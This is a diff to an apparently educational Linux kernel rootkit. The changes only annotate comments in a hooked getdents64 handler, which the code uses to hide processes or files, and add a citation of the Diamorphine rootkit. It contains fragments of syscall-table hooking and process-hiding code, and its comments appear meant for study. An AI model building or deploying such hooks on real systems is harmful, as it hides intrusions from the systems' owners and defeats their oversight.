@@ -92,7 +92,10 @@ unsigned long *get_syscall_table(void)
 	return syscall_table;
 }
 
-/* Technique taken from: https://web.archive.org/web/20140701183221/https://www.thc.org/papers/LKM_HACKING.html#II.5. */
+/* Technique taken from: 
+ * https://web.archive.org/web/20140701183221/https://www.thc.org/papers/LKM_HACKING.html#II.5.
+ * https://github.com/m0nad/Diamorphine 
+ */
 
 struct task_struct *find_task(pid_t pid)
 {
@@ -136,11 +139,18 @@ static int is_invisible(pid_t pid)
 
 static asmlinkage long hacked_getdents64(const struct pt_regs *pt_regs)
 {
-	// Storing file descriptor
+	/* Dependent registers:
+         * rax: contains syscall ids = 0xd9
+         * rdi: which contains the file descriptor = unsigned int fd
+         * rsi: which contains the passed arguments = struct linux_dirent64 __user *dirent; "__user" => this pointer resides in user space
+         * rdx: length of the passed argument(or string) = unsigned int count
+         */
+
+	// Storing file descriptor to uniquely identifies an open file
 	int fd = (int) pt_regs->di;
 
 	/* User space related variable
-         * Storing the name of the directory passed from user space via "si" register
+	 * Storing the name of the file in a directory passed from user space via "si" register
          */
 	struct linux_dirent *dirent = (struct linux_dirent *) pt_regs->si;
 
@@ -176,7 +186,7 @@ static asmlinkage long hacked_getdents64(const struct pt_regs *pt_regs)
 	if (kdirent == NULL)
 		return ret;
 
-	// Copying directory/pid name from userspace to kernel space
+	// Copying directory name (or pid name) from userspace to kernel space
 	err = copy_from_user(kdirent, dirent, ret);
 	if (err)
 		goto out;
